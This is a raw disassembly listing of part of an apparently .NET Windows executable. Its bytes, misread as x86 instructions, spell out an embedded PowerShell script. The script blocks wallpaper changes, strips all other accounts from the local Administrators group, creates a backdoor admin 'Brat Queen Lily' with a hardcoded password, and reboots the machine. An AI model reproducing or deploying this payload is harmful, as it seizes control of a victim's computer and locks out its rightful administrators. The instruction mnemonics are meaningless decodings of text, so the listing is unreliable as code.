  405062:	70 65                	jo     0x4050c9
  405064:	72 74                	jb     0x4050da
  405066:	79 20                	jns    0x405088
  405068:	2d 50 61 74 68       	sub    $0x68746150,%eax
  40506d:	20 24 52             	and    %ah,(%edx,%edx,2)
  405070:	65 67 50             	gs addr16 push %eax
  405073:	61                   	popa
  405074:	74 68                	je     0x4050de
  405076:	20 2d 4e 61 6d 65    	and    %ch,0x656d614e
  40507c:	20 22                	and    %ah,(%edx)
  40507e:	4e                   	dec    %esi
  40507f:	6f                   	outsl  %ds:(%esi),(%dx)
  405080:	43                   	inc    %ebx
  405081:	68 61 6e 67 69       	push   $0x69676e61
  405086:	6e                   	outsb  %ds:(%esi),(%dx)
  405087:	67 57                	addr16 push %edi
  405089:	61                   	popa
  40508a:	6c                   	insb   (%dx),%es:(%edi)
  40508b:	6c                   	insb   (%dx),%es:(%edi)
  40508c:	70 61                	jo     0x4050ef
  40508e:	70 65                	jo     0x4050f5
  405090:	72 22                	jb     0x4050b4
  405092:	20 2d 56 61 6c 75    	and    %ch,0x756c6156
  405098:	65 20 31             	and    %dh,%gs:(%ecx)
  40509b:	20 2d 54 79 70 65    	and    %ch,0x65707954
  4050a1:	20 44 57 4f          	and    %al,0x4f(%edi,%edx,2)
  4050a5:	52                   	push   %edx
  4050a6:	44                   	inc    %esp
  4050a7:	20 2d 46 6f 72 63    	and    %ch,0x63726f46
  4050ad:	65 0d 0a 0d 0a 57    	gs or  $0x570a0d0a,%eax
  4050b3:	72 69                	jb     0x40511e
  4050b5:	74 65                	je     0x40511c
  4050b7:	2d 48 6f 73 74       	sub    $0x74736f48,%eax
  4050bc:	20 22                	and    %ah,(%edx)
  4050be:	57                   	push   %edi
  4050bf:	61                   	popa
  4050c0:	6c                   	insb   (%dx),%es:(%edi)
  4050c1:	6c                   	insb   (%dx),%es:(%edi)
  4050c2:	70 61                	jo     0x405125
  4050c4:	70 65                	jo     0x40512b
  4050c6:	72 20                	jb     0x4050e8
  4050c8:	63 68 61             	arpl   %ebp,0x61(%eax)
  4050cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4050cc:	67 69 6e 67 20 68 61 	imul   $0x73616820,0x67(%bp),%ebp
  4050d3:	73 
  4050d4:	20 62 65             	and    %ah,0x65(%edx)
  4050d7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4050d9:	20 64 69 73          	and    %ah,0x73(%ecx,%ebp,2)
  4050dd:	61                   	popa
  4050de:	62 6c 65 64          	bound  %ebp,0x64(%ebp,%eiz,2)
  4050e2:	20 66 6f             	and    %ah,0x6f(%esi)
  4050e5:	72 20                	jb     0x405107
  4050e7:	74 68                	je     0x405151
  4050e9:	65 20 63 75          	and    %ah,%gs:0x75(%ebx)
  4050ed:	72 72                	jb     0x405161
  4050ef:	65 6e                	outsb  %gs:(%esi),(%dx)
  4050f1:	74 20                	je     0x405113
  4050f3:	75 73                	jne    0x405168
  4050f5:	65 72 2e             	gs jb  0x405126
  4050f8:	22 0d 0a 0d 0a 24    	and    0x240a0d0a,%cl
  4050fe:	4e                   	dec    %esi
  4050ff:	65 77 41             	gs ja  0x405143
  405102:	64 6d                	fs insl (%dx),%es:(%edi)
  405104:	69 6e 55 73 65 72 6e 	imul   $0x6e726573,0x55(%esi),%ebp
  40510b:	61                   	popa
  40510c:	6d                   	insl   (%dx),%es:(%edi)
  40510d:	65 20 3d 20 22 42 72 	and    %bh,%gs:0x72422220
  405114:	61                   	popa
  405115:	74 20                	je     0x405137
  405117:	51                   	push   %ecx
  405118:	75 65                	jne    0x40517f
  40511a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40511c:	20 4c 69 6c          	and    %cl,0x6c(%ecx,%ebp,2)
  405120:	79 22                	jns    0x405144
  405122:	0d 0a 24 4e 65       	or     $0x654e240a,%eax
  405127:	77 41                	ja     0x40516a
  405129:	64 6d                	fs insl (%dx),%es:(%edi)
  40512b:	69 6e 50 61 73 73 77 	imul   $0x77737361,0x50(%esi),%ebp
  405132:	6f                   	outsl  %ds:(%esi),(%dx)
  405133:	72 64                	jb     0x405199
  405135:	20 3d 20 43 6f 6e    	and    %bh,0x6e6f4320
  40513b:	76 65                	jbe    0x4051a2
  40513d:	72 74                	jb     0x4051b3
  40513f:	54                   	push   %esp
  405140:	6f                   	outsl  %ds:(%esi),(%dx)
  405141:	2d 53 65 63 75       	sub    $0x75636553,%eax
  405146:	72 65                	jb     0x4051ad
  405148:	53                   	push   %ebx
  405149:	74 72                	je     0x4051bd
  40514b:	69 6e 67 20 22 6d 6f 	imul   $0x6f6d2220,0x67(%esi),%ebp
  405152:	6d                   	insl   (%dx),%es:(%edi)
  405153:	6d                   	insl   (%dx),%es:(%edi)
  405154:	79 6c                	jns    0x4051c2
  405156:	69 6c 79 6f 77 6e 73 	imul   $0x6d736e77,0x6f(%ecx,%edi,2),%ebp
  40515d:	6d 
  40515e:	65 22 20             	and    %gs:(%eax),%ah
  405161:	2d 41 73 50 6c       	sub    $0x6c507341,%eax
  405166:	61                   	popa
  405167:	69 6e 54 65 78 74 20 	imul   $0x20747865,0x54(%esi),%ebp
  40516e:	2d 46 6f 72 63       	sub    $0x63726f46,%eax
  405173:	65 0d 0a 0d 0a 24    	gs or  $0x240a0d0a,%eax
  405179:	41                   	inc    %ecx
  40517a:	64 6d                	fs insl (%dx),%es:(%edi)
  40517c:	69 6e 47 72 6f 75 70 	imul   $0x70756f72,0x47(%esi),%ebp
  405183:	20 3d 20 47 65 74    	and    %bh,0x74654720
  405189:	2d 4c 6f 63 61       	sub    $0x61636f4c,%eax
  40518e:	6c                   	insb   (%dx),%es:(%edi)
  40518f:	47                   	inc    %edi
  405190:	72 6f                	jb     0x405201
  405192:	75 70                	jne    0x405204
  405194:	20 2d 4e 61 6d 65    	and    %ch,0x656d614e
  40519a:	20 22                	and    %ah,(%edx)
  40519c:	41                   	inc    %ecx
  40519d:	64 6d                	fs insl (%dx),%es:(%edi)
  40519f:	69 6e 69 73 74 72 61 	imul   $0x61727473,0x69(%esi),%ebp
  4051a6:	74 6f                	je     0x405217
  4051a8:	72 73                	jb     0x40521d
  4051aa:	22 0d 0a 0d 0a 24    	and    0x240a0d0a,%cl
  4051b0:	43                   	inc    %ebx
  4051b1:	75 72                	jne    0x405225
  4051b3:	72 65                	jb     0x40521a
  4051b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4051b6:	74 41                	je     0x4051f9
  4051b8:	64 6d                	fs insl (%dx),%es:(%edi)
  4051ba:	69 6e 73 20 3d 20 47 	imul   $0x47203d20,0x73(%esi),%ebp
  4051c1:	65 74 2d             	gs je  0x4051f1
  4051c4:	4c                   	dec    %esp
  4051c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4051c6:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4051c9:	47                   	inc    %edi
  4051ca:	72 6f                	jb     0x40523b
  4051cc:	75 70                	jne    0x40523e
  4051ce:	4d                   	dec    %ebp
  4051cf:	65 6d                	gs insl (%dx),%es:(%edi)
  4051d1:	62 65 72             	bound  %esp,0x72(%ebp)
  4051d4:	20 2d 47 72 6f 75    	and    %ch,0x756f7247
  4051da:	70 20                	jo     0x4051fc
  4051dc:	24 41                	and    $0x41,%al
  4051de:	64 6d                	fs insl (%dx),%es:(%edi)
  4051e0:	69 6e 47 72 6f 75 70 	imul   $0x70756f72,0x47(%esi),%ebp
  4051e7:	0d 0a 0d 0a 66       	or     $0x660a0d0a,%eax
  4051ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4051ed:	72 65                	jb     0x405254
  4051ef:	61                   	popa
  4051f0:	63 68 20             	arpl   %ebp,0x20(%eax)
  4051f3:	28 24 41             	sub    %ah,(%ecx,%eax,2)
  4051f6:	64 6d                	fs insl (%dx),%es:(%edi)
  4051f8:	69 6e 20 69 6e 20 24 	imul   $0x24206e69,0x20(%esi),%ebp
  4051ff:	43                   	inc    %ebx
  405200:	75 72                	jne    0x405274
  405202:	72 65                	jb     0x405269
  405204:	6e                   	outsb  %ds:(%esi),(%dx)
  405205:	74 41                	je     0x405248
  405207:	64 6d                	fs insl (%dx),%es:(%edi)
  405209:	69 6e 73 29 20 7b 0d 	imul   $0xd7b2029,0x73(%esi),%ebp
  405210:	0a 20                	or     (%eax),%ah
  405212:	20 20                	and    %ah,(%eax)
  405214:	20 69 66             	and    %ch,0x66(%ecx)
  405217:	20 28                	and    %ch,(%eax)
  405219:	24 41                	and    $0x41,%al
  40521b:	64 6d                	fs insl (%dx),%es:(%edi)
  40521d:	69 6e 2e 4e 61 6d 65 	imul   $0x656d614e,0x2e(%esi),%ebp
  405224:	20 2d 6e 65 20 22    	and    %ch,0x2220656e
  40522a:	42                   	inc    %edx
  40522b:	55                   	push   %ebp
  40522c:	49                   	dec    %ecx
  40522d:	4c                   	dec    %esp
  40522e:	54                   	push   %esp
  40522f:	49                   	dec    %ecx
  405230:	4e                   	dec    %esi
  405231:	5c                   	pop    %esp
  405232:	41                   	inc    %ecx
  405233:	64 6d                	fs insl (%dx),%es:(%edi)
  405235:	69 6e 69 73 74 72 61 	imul   $0x61727473,0x69(%esi),%ebp
  40523c:	74 6f                	je     0x4052ad
  40523e:	72 22                	jb     0x405262
  405240:	20 2d 61 6e 64 20    	and    %ch,0x20646e61
  405246:	24 41                	and    $0x41,%al
  405248:	64 6d                	fs insl (%dx),%es:(%edi)
  40524a:	69 6e 2e 4e 61 6d 65 	imul   $0x656d614e,0x2e(%esi),%ebp
  405251:	20 2d 6e 65 20 22    	and    %ch,0x2220656e
  405257:	4e                   	dec    %esi
  405258:	54                   	push   %esp
  405259:	20 41 55             	and    %al,0x55(%ecx)
  40525c:	54                   	push   %esp
  40525d:	48                   	dec    %eax
  40525e:	4f                   	dec    %edi
  40525f:	52                   	push   %edx
  405260:	49                   	dec    %ecx
  405261:	54                   	push   %esp
  405262:	59                   	pop    %ecx
  405263:	5c                   	pop    %esp
  405264:	53                   	push   %ebx
  405265:	59                   	pop    %ecx
  405266:	53                   	push   %ebx
  405267:	54                   	push   %esp
  405268:	45                   	inc    %ebp
  405269:	4d                   	dec    %ebp
  40526a:	22 29                	and    (%ecx),%ch
  40526c:	20 7b 0d             	and    %bh,0xd(%ebx)
  40526f:	0a 20                	or     (%eax),%ah
  405271:	20 20                	and    %ah,(%eax)
  405273:	20 20                	and    %ah,(%eax)
  405275:	20 20                	and    %ah,(%eax)
  405277:	20 57 72             	and    %dl,0x72(%edi)
  40527a:	69 74 65 2d 48 6f 73 	imul   $0x74736f48,0x2d(%ebp,%eiz,2),%esi
  405281:	74 
  405282:	20 22                	and    %ah,(%edx)
  405284:	52                   	push   %edx
  405285:	65 6d                	gs insl (%dx),%es:(%edi)
  405287:	6f                   	outsl  %ds:(%esi),(%dx)
  405288:	76 69                	jbe    0x4052f3
  40528a:	6e                   	outsb  %ds:(%esi),(%dx)
  40528b:	67 20 24             	and    %ah,(%si)
  40528e:	28 24 41             	sub    %ah,(%ecx,%eax,2)
  405291:	64 6d                	fs insl (%dx),%es:(%edi)
  405293:	69 6e 2e 4e 61 6d 65 	imul   $0x656d614e,0x2e(%esi),%ebp
  40529a:	29 20                	sub    %esp,(%eax)
  40529c:	66 72 6f             	data16 jb 0x40530e
  40529f:	6d                   	insl   (%dx),%es:(%edi)
  4052a0:	20 41 64             	and    %al,0x64(%ecx)
  4052a3:	6d                   	insl   (%dx),%es:(%edi)
  4052a4:	69 6e 69 73 74 72 61 	imul   $0x61727473,0x69(%esi),%ebp
  4052ab:	74 6f                	je     0x40531c
  4052ad:	72 73                	jb     0x405322
  4052af:	20 67 72             	and    %ah,0x72(%edi)
  4052b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4052b3:	75 70                	jne    0x405325
  4052b5:	2e 2e 2e 22 0d 0a 20 	cs cs and %cs:0x2020200a,%cl
  4052bc:	20 20 
  4052be:	20 20                	and    %ah,(%eax)
  4052c0:	20 20                	and    %ah,(%eax)
  4052c2:	20 52 65             	and    %dl,0x65(%edx)
  4052c5:	6d                   	insl   (%dx),%es:(%edi)
  4052c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4052c7:	76 65                	jbe    0x40532e
  4052c9:	2d 4c 6f 63 61       	sub    $0x61636f4c,%eax
  4052ce:	6c                   	insb   (%dx),%es:(%edi)
  4052cf:	47                   	inc    %edi
  4052d0:	72 6f                	jb     0x405341
  4052d2:	75 70                	jne    0x405344
  4052d4:	4d                   	dec    %ebp
  4052d5:	65 6d                	gs insl (%dx),%es:(%edi)
  4052d7:	62 65 72             	bound  %esp,0x72(%ebp)
  4052da:	20 2d 47 72 6f 75    	and    %ch,0x756f7247
  4052e0:	70 20                	jo     0x405302
  4052e2:	24 41                	and    $0x41,%al
  4052e4:	64 6d                	fs insl (%dx),%es:(%edi)
  4052e6:	69 6e 47 72 6f 75 70 	imul   $0x70756f72,0x47(%esi),%ebp
  4052ed:	20 2d 4d 65 6d 62    	and    %ch,0x626d654d
  4052f3:	65 72 20             	gs jb  0x405316
  4052f6:	24 41                	and    $0x41,%al
  4052f8:	64 6d                	fs insl (%dx),%es:(%edi)
  4052fa:	69 6e 20 2d 43 6f 6e 	imul   $0x6e6f432d,0x20(%esi),%ebp
  405301:	66 69 72 6d 3a 24    	imul   $0x243a,0x6d(%edx),%si
  405307:	66 61                	popaw
  405309:	6c                   	insb   (%dx),%es:(%edi)
  40530a:	73 65                	jae    0x405371
  40530c:	0d 0a 20 20 20       	or     $0x2020200a,%eax
  405311:	20 7d 0d             	and    %bh,0xd(%ebp)
  405314:	0a 7d 0d             	or     0xd(%ebp),%bh
  405317:	0a 0d 0a 57 72 69    	or     0x6972570a,%cl
  40531d:	74 65                	je     0x405384
  40531f:	2d 48 6f 73 74       	sub    $0x74736f48,%eax
  405324:	20 22                	and    %ah,(%edx)
  405326:	43                   	inc    %ebx
  405327:	72 65                	jb     0x40538e
  405329:	61                   	popa
  40532a:	74 69                	je     0x405395
  40532c:	6e                   	outsb  %ds:(%esi),(%dx)
  40532d:	67 20 6e 65          	and    %ch,0x65(%bp)
  405331:	77 20                	ja     0x405353
  405333:	6c                   	insb   (%dx),%es:(%edi)
  405334:	6f                   	outsl  %ds:(%esi),(%dx)
  405335:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  405338:	20 61 64             	and    %ah,0x64(%ecx)
  40533b:	6d                   	insl   (%dx),%es:(%edi)
  40533c:	69 6e 69 73 74 72 61 	imul   $0x61727473,0x69(%esi),%ebp
  405343:	74 6f                	je     0x4053b4
  405345:	72 20                	jb     0x405367
  405347:	61                   	popa
  405348:	63 63 6f             	arpl   %esp,0x6f(%ebx)
  40534b:	75 6e                	jne    0x4053bb
  40534d:	74 3a                	je     0x405389
  40534f:	20 24 4e             	and    %ah,(%esi,%ecx,2)
  405352:	65 77 41             	gs ja  0x405396
  405355:	64 6d                	fs insl (%dx),%es:(%edi)
  405357:	69 6e 55 73 65 72 6e 	imul   $0x6e726573,0x55(%esi),%ebp
  40535e:	61                   	popa
  40535f:	6d                   	insl   (%dx),%es:(%edi)
  405360:	65 22 0d 0a 4e 65 77 	and    %gs:0x77654e0a,%cl
  405367:	2d 4c 6f 63 61       	sub    $0x61636f4c,%eax
  40536c:	6c                   	insb   (%dx),%es:(%edi)
  40536d:	55                   	push   %ebp
  40536e:	73 65                	jae    0x4053d5
  405370:	72 20                	jb     0x405392
  405372:	2d 4e 61 6d 65       	sub    $0x656d614e,%eax
  405377:	20 24 4e             	and    %ah,(%esi,%ecx,2)
  40537a:	65 77 41             	gs ja  0x4053be
  40537d:	64 6d                	fs insl (%dx),%es:(%edi)
  40537f:	69 6e 55 73 65 72 6e 	imul   $0x6e726573,0x55(%esi),%ebp
  405386:	61                   	popa
  405387:	6d                   	insl   (%dx),%es:(%edi)
  405388:	65 20 2d 50 61 73 73 	and    %ch,%gs:0x73736150
  40538f:	77 6f                	ja     0x405400
  405391:	72 64                	jb     0x4053f7
  405393:	20 24 4e             	and    %ah,(%esi,%ecx,2)
  405396:	65 77 41             	gs ja  0x4053da
  405399:	64 6d                	fs insl (%dx),%es:(%edi)
  40539b:	69 6e 50 61 73 73 77 	imul   $0x77737361,0x50(%esi),%ebp
  4053a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4053a3:	72 64                	jb     0x405409
  4053a5:	20 2d 46 75 6c 6c    	and    %ch,0x6c6c7546
  4053ab:	4e                   	dec    %esi
  4053ac:	61                   	popa
  4053ad:	6d                   	insl   (%dx),%es:(%edi)
  4053ae:	65 20 22             	and    %ah,%gs:(%edx)
  4053b1:	42                   	inc    %edx
  4053b2:	72 61                	jb     0x405415
  4053b4:	74 20                	je     0x4053d6
  4053b6:	51                   	push   %ecx
  4053b7:	75 65                	jne    0x40541e
  4053b9:	65 6e                	outsb  %gs:(%esi),(%dx)
  4053bb:	20 4c 69 6c          	and    %cl,0x6c(%ecx,%ebp,2)
  4053bf:	79 22                	jns    0x4053e3
  4053c1:	20 2d 44 65 73 63    	and    %ch,0x63736544
  4053c7:	72 69                	jb     0x405432
  4053c9:	70 74                	jo     0x40543f
  4053cb:	69 6f 6e 20 22 44 65 	imul   $0x65442220,0x6e(%edi),%ebp
  4053d2:	64 69 63 61 74 65 64 	imul   $0x20646574,%fs:0x61(%ebx),%esp
  4053d9:	20 
  4053da:	6c                   	insb   (%dx),%es:(%edi)
  4053db:	6f                   	outsl  %ds:(%esi),(%dx)
  4053dc:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4053df:	20 61 64             	and    %ah,0x64(%ecx)
  4053e2:	6d                   	insl   (%dx),%es:(%edi)
  4053e3:	69 6e 20 61 63 63 6f 	imul   $0x6f636361,0x20(%esi),%ebp
  4053ea:	75 6e                	jne    0x40545a
  4053ec:	74 22                	je     0x405410
  4053ee:	0d 0a 0d 0a 57       	or     $0x570a0d0a,%eax
  4053f3:	72 69                	jb     0x40545e
  4053f5:	74 65                	je     0x40545c
  4053f7:	2d 48 6f 73 74       	sub    $0x74736f48,%eax
  4053fc:	20 22                	and    %ah,(%edx)
  4053fe:	41                   	inc    %ecx
  4053ff:	64 64 69 6e 67 20 24 	fs imul $0x654e2420,%fs:0x67(%esi),%ebp
  405406:	4e 65 
  405408:	77 41                	ja     0x40544b
  40540a:	64 6d                	fs insl (%dx),%es:(%edi)
  40540c:	69 6e 55 73 65 72 6e 	imul   $0x6e726573,0x55(%esi),%ebp
  405413:	61                   	popa
  405414:	6d                   	insl   (%dx),%es:(%edi)
  405415:	65 20 74 6f 20       	and    %dh,%gs:0x20(%edi,%ebp,2)
  40541a:	41                   	inc    %ecx
  40541b:	64 6d                	fs insl (%dx),%es:(%edi)
  40541d:	69 6e 69 73 74 72 61 	imul   $0x61727473,0x69(%esi),%ebp
  405424:	74 6f                	je     0x405495
  405426:	72 73                	jb     0x40549b
  405428:	20 67 72             	and    %ah,0x72(%edi)
  40542b:	6f                   	outsl  %ds:(%esi),(%dx)
  40542c:	75 70                	jne    0x40549e
  40542e:	2e 2e 2e 22 0d 0a 41 	cs cs and %cs:0x6464410a,%cl
  405435:	64 64 
  405437:	2d 4c 6f 63 61       	sub    $0x61636f4c,%eax
  40543c:	6c                   	insb   (%dx),%es:(%edi)
  40543d:	47                   	inc    %edi
  40543e:	72 6f                	jb     0x4054af
  405440:	75 70                	jne    0x4054b2
  405442:	4d                   	dec    %ebp
  405443:	65 6d                	gs insl (%dx),%es:(%edi)
  405445:	62 65 72             	bound  %esp,0x72(%ebp)
  405448:	20 2d 47 72 6f 75    	and    %ch,0x756f7247
  40544e:	70 20                	jo     0x405470
  405450:	24 41                	and    $0x41,%al
  405452:	64 6d                	fs insl (%dx),%es:(%edi)
  405454:	69 6e 47 72 6f 75 70 	imul   $0x70756f72,0x47(%esi),%ebp
  40545b:	20 2d 4d 65 6d 62    	and    %ch,0x626d654d
  405461:	65 72 20             	gs jb  0x405484
  405464:	24 4e                	and    $0x4e,%al
  405466:	65 77 41             	gs ja  0x4054aa
  405469:	64 6d                	fs insl (%dx),%es:(%edi)
  40546b:	69 6e 55 73 65 72 6e 	imul   $0x6e726573,0x55(%esi),%ebp
  405472:	61                   	popa
  405473:	6d                   	insl   (%dx),%es:(%edi)
  405474:	65 0d 0a 0d 0a 57    	gs or  $0x570a0d0a,%eax
  40547a:	72 69                	jb     0x4054e5
  40547c:	74 65                	je     0x4054e3
  40547e:	2d 48 6f 73 74       	sub    $0x74736f48,%eax
  405483:	20 22                	and    %ah,(%edx)
  405485:	53                   	push   %ebx
  405486:	63 72 69             	arpl   %esi,0x69(%edx)
  405489:	70 74                	jo     0x4054ff
  40548b:	20 65 78             	and    %ah,0x78(%ebp)
  40548e:	65 63 75 74          	arpl   %esi,%gs:0x74(%ebp)
  405492:	69 6f 6e 20 63 6f 6d 	imul   $0x6d6f6320,0x6e(%edi),%ebp
  405499:	70 6c                	jo     0x405507
  40549b:	65 74 65             	gs je  0x405503
  40549e:	2e 20 43 68          	and    %al,%cs:0x68(%ebx)
  4054a2:	65 63 6b 20          	arpl   %ebp,%gs:0x20(%ebx)
  4054a6:	6c                   	insb   (%dx),%es:(%edi)
  4054a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4054a8:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4054ab:	20 61 64             	and    %ah,0x64(%ecx)
  4054ae:	6d                   	insl   (%dx),%es:(%edi)
  4054af:	69 6e 69 73 74 72 61 	imul   $0x61727473,0x69(%esi),%ebp
  4054b6:	74 6f                	je     0x405527
  4054b8:	72 20                	jb     0x4054da
  4054ba:	61                   	popa
  4054bb:	63 63 6f             	arpl   %esp,0x6f(%ebx)
  4054be:	75 6e                	jne    0x40552e
  4054c0:	74 73                	je     0x405535
  4054c2:	2e 22 0d 0a 0d 0a 52 	and    %cs:0x520a0d0a,%cl
  4054c9:	65 73 74             	gs jae 0x405540
  4054cc:	61                   	popa
  4054cd:	72 74                	jb     0x405543
  4054cf:	2d 43 6f 6d 70       	sub    $0x706d6f43,%eax
  4054d4:	75 74                	jne    0x40554a
  4054d6:	65 72 42             	gs jb  0x40551b
  4054d9:	53                   	push   %ebx
  4054da:	4a                   	dec    %edx
  4054db:	42                   	inc    %edx
  4054dc:	01 00                	add    %eax,(%eax)
  4054de:	01 00                	add    %eax,(%eax)
  4054e0:	00 00                	add    %al,(%eax)
  4054e2:	00 00                	add    %al,(%eax)
  4054e4:	0c 00                	or     $0x0,%al
  4054e6:	00 00                	add    %al,(%eax)
  4054e8:	76 34                	jbe    0x40551e
  4054ea:	2e 30 2e             	xor    %ch,%cs:(%esi)
  4054ed:	33 30                	xor    (%eax),%esi
  4054ef:	33 31                	xor    (%ecx),%esi
  4054f1:	39 00                	cmp    %eax,(%eax)
  4054f3:	00 00                	add    %al,(%eax)
  4054f5:	00 05 00 6c 00 00    	add    %al,0x6c00
  4054fb:	00 1c 1c             	add    %bl,(%esp,%ebx,1)
  4054fe:	00 00                	add    %al,(%eax)
  405500:	23 7e 00             	and    0x0(%esi),%edi
  405503:	00 88 1c 00 00 70    	add    %cl,0x7000001c(%eax)
  405509:	22 00                	and    (%eax),%al
  40550b:	00 23                	add    %ah,(%ebx)
  40550d:	53                   	push   %ebx
  40550e:	74 72                	je     0x405582
  405510:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  405517:	00 f8                	add    %bh,%al
  405519:	3e 00 00             	add    %al,%ds:(%eax)
  40551c:	8c 04 00             	mov    %es,(%eax,%eax,1)
  40551f:	00 23                	add    %ah,(%ebx)
  405521:	55                   	push   %ebp
  405522:	53                   	push   %ebx
  405523:	00 84 43 00 00 10 00 	add    %al,0x100000(%ebx,%eax,2)
  40552a:	00 00                	add    %al,(%eax)
  40552c:	23 47 55             	and    0x55(%edi),%eax
  40552f:	49                   	dec    %ecx
  405530:	44                   	inc    %esp
  405531:	00 00                	add    %al,(%eax)
  405533:	00 94 43 00 00 30 08 	add    %dl,0x8300000(%ebx,%eax,2)
  40553a:	00 00                	add    %al,(%eax)
  40553c:	23 42 6c             	and    0x6c(%edx),%eax
  40553f:	6f                   	outsl  %ds:(%esi),(%dx)
  405540:	62 00                	bound  %eax,(%eax)
  405542:	00 00                	add    %al,(%eax)
  405544:	00 00                	add    %al,(%eax)
  405546:	00 00                	add    %al,(%eax)
  405548:	02 00                	add    (%eax),%al
  40554a:	00 01                	add    %al,(%ecx)
  40554c:	57                   	push   %edi
  40554d:	3f                   	aas
  40554e:	a2 1d 09 0b 00       	mov    %al,0xb091d
  405553:	00 00                	add    %al,(%eax)
  405555:	fa                   	cli
  405556:	25 33 00 16 00       	and    $0x160033,%eax
  40555b:	00 01                	add    %al,(%ecx)
  40555d:	00 00                	add    %al,(%eax)
  40555f:	00 93 00 00 00 16    	add    %dl,0x16000000(%ebx)
  405565:	00 00                	add    %al,(%eax)
  405567:	00 59 00             	add    %bl,0x0(%ecx)
  40556a:	00 00                	add    %al,(%eax)
  40556c:	7d 00                	jge    0x40556e
  40556e:	00 00                	add    %al,(%eax)
  405570:	80 00 00             	addb   $0x0,(%eax)
  405573:	00 01                	add    %al,(%ecx)
  405575:	00 00                	add    %al,(%eax)
  405577:	00 1d 01 00 00 21    	add    %bl,0x21000001
  40557d:	00 00                	add    %al,(%eax)
  40557f:	00 0b                	add    %cl,(%ebx)
  405581:	00 00                	add    %al,(%eax)
  405583:	00 02                	add    %al,(%edx)
  405585:	00 00                	add    %al,(%eax)
  405587:	00 13                	add    %dl,(%ebx)
  405589:	00 00                	add    %al,(%eax)
  40558b:	00 06                	add    %al,(%esi)
  40558d:	00 00                	add    %al,(%eax)
  40558f:	00 21                	add    %ah,(%ecx)
  405591:	00 00                	add    %al,(%eax)
  405593:	00 37                	add    %dh,(%edi)
  405595:	00 00                	add    %al,(%eax)
  405597:	00 03                	add    %al,(%ebx)
  405599:	00 00                	add    %al,(%eax)
  40559b:	00 0b                	add    %cl,(%ebx)
  40559d:	00 00                	add    %al,(%eax)
  40559f:	00 05 00 00 00 01    	add    %al,0x1000000
  4055a5:	00 00                	add    %al,(%eax)
  4055a7:	00 05 00 00 00 01    	add    %al,0x1000000
  4055ad:	00 00                	add    %al,(%eax)
  4055af:	00 0a                	add    %cl,(%edx)
  4055b1:	00 00                	add    %al,(%eax)
  4055b3:	00 02                	add    %al,(%edx)
  4055b5:	00 00                	add    %al,(%eax)
  4055b7:	00 00                	add    %al,(%eax)
  4055b9:	00 0a                	add    %cl,(%edx)
  4055bb:	00 01                	add    %al,(%ecx)
  4055bd:	00 00                	add    %al,(%eax)
  4055bf:	00 00                	add    %al,(%eax)
  4055c1:	00 06                	add    %al,(%esi)
  4055c3:	00 3a                	add    %bh,(%edx)
  4055c5:	01 33                	add    %esi,(%ebx)
  4055c7:	01 06                	add    %eax,(%esi)
  4055c9:	00 41 01             	add    %al,0x1(%ecx)
  4055cc:	33 01                	xor    (%ecx),%eax
  4055ce:	06                   	push   %es
  4055cf:	00 4b 01             	add    %cl,0x1(%ebx)
  4055d2:	33 01                	xor    (%ecx),%eax
  4055d4:	0a 00                	or     (%eax),%al
  4055d6:	8f 01                	pop    (%ecx)
  4055d8:	6d                   	insl   (%dx),%es:(%edi)
  4055d9:	01 0e                	add    %ecx,(%esi)
  4055db:	00 bb 01 a6 01 0a    	add    %bh,0xa01a601(%ebx)
  4055e1:	00 c0                	add    %al,%al
  4055e3:	01 6d 01             	add    %ebp,0x1(%ebp)
  4055e6:	0a 00                	or     (%eax),%al
  4055e8:	d4 01                	aam    $0x1
  4055ea:	6d                   	insl   (%dx),%es:(%edi)
  4055eb:	01 06                	add    %eax,(%esi)
  4055ed:	00 e7                	add    %ah,%bh
  4055ef:	01 db                	add    %ebx,%ebx
  4055f1:	01 0a                	add    %ecx,(%edx)
  4055f3:	00 10                	add    %dl,(%eax)
  4055f5:	02 50 01             	add    0x1(%eax),%dl
  4055f8:	0a 00                	or     (%eax),%al
  4055fa:	22 02                	and    (%edx),%al
  4055fc:	50                   	push   %eax
  4055fd:	01 06                	add    %eax,(%esi)
  4055ff:	00 84 04 33 01 0a 00 	add    %al,0xa0133(%esp,%eax,1)
  405606:	df 04 6d 01 0a 00 02 	filds  0x2000a01(,%ebp,2)
  40560d:	05 6d 01 0a 00       	add    $0xa016d,%eax
  405612:	9a 05 6d 01 0a 00 a5 	lcall  $0xa500,$0xa016d05
  405619:	05 6d 01 0a 00       	add    $0xa016d,%eax
  40561e:	fe 05 6d 01 0a 00    	incb   0xa016d
  405624:	06                   	push   %es
  405625:	06                   	push   %es
  405626:	6d                   	insl   (%dx),%es:(%edi)
  405627:	01 0e                	add    %ecx,(%esi)
  405629:	00 51 07             	add    %dl,0x7(%ecx)
  40562c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40562d:	01 06                	add    %eax,(%esi)
  40562f:	00 82 07 63 07 0a    	add    %al,0xa076307(%edx)
  405635:	00 8f 07 6d 01 0e    	add    %cl,0xe016d07(%edi)
  40563b:	00 ab 07 a6 01 0e    	add    %ch,0xe01a607(%ebx)
  405641:	00 d5                	add    %dl,%ch
  405643:	07                   	pop    %es
  405644:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405645:	01 12                	add    %edx,(%edx)
  405647:	00 2b                	add    %ch,(%ebx)
  405649:	08 1d 08 06 00 6c    	or     %bl,0x6c000608
  40564f:	08 51 08             	or     %dl,0x8(%ecx)
  405652:	16                   	push   %ss
  405653:	00 93 08 84 08 12    	add    %dl,0x12088408(%ebx)
  405659:	00 ba 08 1d 08 0a    	add    %bh,0xa081d08(%edx)
  40565f:	00 e4                	add    %ah,%ah
  405661:	08 50 01             	or     %dl,0x1(%eax)
  405664:	0e                   	push   %cs
  405665:	00 fa                	add    %bh,%dl
